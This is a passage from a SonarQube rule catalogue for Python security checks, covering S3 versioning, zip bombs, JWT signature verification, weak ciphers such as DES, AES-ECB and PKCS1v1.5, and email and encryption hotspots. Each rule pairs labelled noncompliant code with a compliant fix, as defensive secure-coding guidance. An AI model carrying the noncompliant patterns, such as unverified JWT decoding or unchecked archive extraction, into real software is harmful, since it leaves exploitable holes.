<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6252">
              python:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
bucket &#61; s3.Bucket(self, &#34;bucket&#34;,
    versioned&#61;False       # Sensitive
)
</pre>
<p>The default value of <code>versioned</code> is <code>False</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
bucket &#61; s3.Bucket(self, &#34;bucket&#34;,
    versioned&#61;True
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html" rel="nofollow">AWS documentation</a> - Using versioning in S3 buckets </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned" rel="nofollow">AWS CDK version 2</a> - Using versioning in S3
  buckets </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5042">
              python:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.python.org/3.5/library/tarfile.html" rel="nofollow">tarfile</a> module:</p>
<pre>
import tarfile

tfile &#61; tarfile.open(&#34;TarBomb.tar&#34;)
tfile.extractall(&#39;./tmp/&#39;)  # Sensitive
tfile.close()
</pre>
<p>For <a href="https://docs.python.org/dev/library/zipfile.html" rel="nofollow">zipfile</a> module:</p>
<pre>
import zipfile

zfile &#61; zipfile.ZipFile(&#39;ZipBomb.zip&#39;, &#39;r&#39;)
zfile.extractall(&#39;./tmp/&#39;) # Sensitive
zfile.close()
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.python.org/3.5/library/tarfile.html" rel="nofollow">tarfile</a> module:</p>
<pre>
import tarfile

THRESHOLD_ENTRIES &#61; 10000
THRESHOLD_SIZE &#61; 1000000000
THRESHOLD_RATIO &#61; 10

totalSizeArchive &#61; 0;
totalEntryArchive &#61; 0;

tfile &#61; tarfile.open(&#34;TarBomb.tar&#34;)
for entry in tfile:
  tarinfo &#61; tfile.extractfile(entry)

  totalEntryArchive &#43;&#61; 1
  sizeEntry &#61; 0
  result &#61; b&#39;&#39;
  while True:
    sizeEntry &#43;&#61; 1024
    totalSizeArchive &#43;&#61; 1024

    ratio &#61; sizeEntry / entry.size
    if ratio &gt; THRESHOLD_RATIO:
      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
      break

    chunk &#61; tarinfo.read(1024)
    if not chunk:
      break

    result &#43;&#61; chunk

  if totalEntryArchive &gt; THRESHOLD_ENTRIES:
    # too much entries in this archive, can lead to inodes exhaustion of the system
    break

  if totalSizeArchive &gt; THRESHOLD_SIZE:
    # the uncompressed data size is too much for the application resource capacity
    break

tfile.close()
</pre>
<p>For <a href="https://docs.python.org/dev/library/zipfile.html" rel="nofollow">zipfile</a> module:</p>
<pre>
import zipfile

THRESHOLD_ENTRIES &#61; 10000
THRESHOLD_SIZE &#61; 1000000000
THRESHOLD_RATIO &#61; 10

totalSizeArchive &#61; 0;
totalEntryArchive &#61; 0;

zfile &#61; zipfile.ZipFile(&#39;ZipBomb.zip&#39;, &#39;r&#39;)
for zinfo in zfile.infolist():
    print(&#39;File&#39;, zinfo.filename)
    data &#61; zfile.read(zinfo)

    totalEntryArchive &#43;&#61; 1

    totalSizeArchive &#61; totalSizeArchive &#43; len(data)
    ratio &#61; len(data) / zinfo.compress_size
    if ratio &gt; THRESHOLD_RATIO:
      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
      break

    if totalSizeArchive &gt; THRESHOLD_SIZE:
      # the uncompressed data size is too much for the application resource capacity
      break

    if totalEntryArchive &gt; THRESHOLD_ENTRIES:
      # too much entries in this archive, can lead to inodes exhaustion of the system
      break

zfile.close()
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5659">
              python:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in PyJWT</h2>
<h3>Code examples</h3>
<p>The following code contains an example of JWT decoding without verification of the signature.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import jwt

jwt.decode(token, verify&#61;False) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>By default, verification is enabled for the method <code>decode</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import jwt

jwt.decode(token, key, algorithms&#61;&#34;HS256&#34;)
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5547">
              python:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Cryptodome</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from Crypto.Cipher import DES # pycryptodome
from Cryptodome.Cipher import DES # pycryptodomex

cipher &#61; DES.new(key, DES.MODE_OFB) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from Crypto.Cipher import AES # pycryptodome
from Cryptodome.Cipher import AES # pycryptodomex

cipher &#61; AES.new(key, AES.MODE_CCM)
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5542">
              python:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in PyCrypto</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from Crypto.Cipher import AES

AES.new(key, AES.MODE_ECB) # Noncompliant
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
from Crypto.Cipher import PKCS1_v1_5

PKCS1_v1_5.new(key) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Since PyCrypto is not supported anymore, another library should be used. In the current context, Cryptodome uses a similar API.</p>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
from Crypto.Cipher import AES

AES.new(key, AES.MODE_GCM)
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
from Crypto.Cipher import PKCS1_OAEP

PKCS1_OAEP.new(key)
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5300">
              python:S5300
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>
<p><strong>Information Exposure</strong></p>
<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>
<p><strong>Spamming / Phishing</strong></p>
<p>Malicious user can abuse email based feature to send spam or phishing content.</p>
<p><strong>Dangerous Content Injection</strong></p>
<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>
<p><strong>Email Headers Injection</strong></p>
<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email &#34;headers&#34;. 
Using unvalidated user input to set those fields might allow attackers to inject new line characters in headers to craft malformed SMTP requests.
Although modern libraries are filtering new line character by default, user data used in email &#34;headers&#34; should always be validated.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9801" rel="nofollow">CVE-2017-9801</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-4803" rel="nofollow">CVE-2016-4803</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Unvalidated user input are used to set email headers. </li><li> Email content contains data provided by users and it is not sanitized. </li><li> Email recipient list or body are based on user inputs. </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use an email library which sanitizes headers (Flask-Mail or django.core.mail). </li><li> Use html escape functions to sanitize every piece of data used to in the email body. </li><li> Verify application logic to make sure that email base feature can not be abuse to:
    <ul><li> Send arbitrary email for spamming or fishing </li><li> Disclose sensitive email content </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<p>smtplib</p>
<pre>
import smtplib

def send(from_email, to_email, msg):
  server &#61; smtplib.SMTP(&#39;localhost&#39;, 1025)
  server.sendmail(from_email, to_email, msg) # Sensitive
</pre>
<p>Django</p>
<pre>
from django.core.mail import send_mail

def send(subject, msg, from_email, to_email):
  send_mail(subject, msg, from_email, [to_email]) # Sensitive
</pre>
<p>Flask-Mail</p>
<pre>
from flask import Flask
from flask_mail import Mail, Message

app &#61; Flask(__name__)

def send(subject, msg, from_email, to_email):
    mail &#61; Mail(app)
    msg &#61; Message(subject, [to_email], body, sender&#61;from_email)
    mail.send(msg) # Sensitive{code}
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.damonkohler.com/2008/12/email-injection.html" rel="nofollow">Email Injection</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/93" rel="nofollow">MITRE, CWE-93</a> - Improper Neutralization of CRLF Sequences (&#39;CRLF Injection&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/80" rel="nofollow">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4787">
              python:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;python%3AS4426&amp;rule_key&#61;python%3AS4426" rel="nofollow">S4426</a>, <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5542&amp;rule_key&#61;python%3AS5542" rel="nofollow">S5542</a>, <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5547&amp;rule_key&#61;python%3AS5547" rel="nofollow">S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7902" rel="nofollow">CVE-2017-7902</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-1378" rel="nofollow">CVE-2006-1378</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2003-1376" rel="nofollow">CVE-2003-1376</a> </li></ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the private key might not be random, strong enough or the same key is reused for a long long time. </li><li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li><li> the key exchange is made without properly authenticating the receiver. </li><li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li><li> the chosen encryption library is deemed unsafe. </li><li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li><li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li><li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li><li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Generate encryption keys using secure random algorithms. </li><li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li><li> Regenerate the keys regularly. </li><li> Always store the keys in a safe location and transfer them only over safe channels. </li><li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li><li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li><li> When a nonce is used, generate it randomly every time. </li><li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li><li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like &#34;Chosen-Plaintext Attacks&#34;. Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li><li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul><li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li><li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<p><code>cryptography</code> module</p>
<pre>
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM, AESCCM
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher


def encrypt(key):
    Fernet(key)  # Sensitive
    ChaCha20Poly1305(key)  # Sensitive
    AESGCM(key)  # Sensitive
    AESCCM(key)  # Sensitive


private_key &#61; rsa.generate_private_key()  # Sensitive


def encrypt2(algorithm, mode, backend):
    Cipher(algorithm, mode, backend)  # Sensitive
</pre>
<p><code>pynacl</code> library</p>
<pre>
from nacl.public import Box
from nacl.secret import SecretBox


def public_encrypt(secret_key, public_key):
    Box(secret_key, public_key)  # Sensitive


def secret_encrypt(key):
    SecretBox(key)  # Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li><li> <a href="https://cwe.mitre.org/data/definitions/322" rel="nofollow">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://cwe.mitre.org/data/definitions/324" rel="nofollow">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li><li> <a href="https://cwe.mitre.org/data/definitions/325" rel="nofollow">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4423">
              python:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
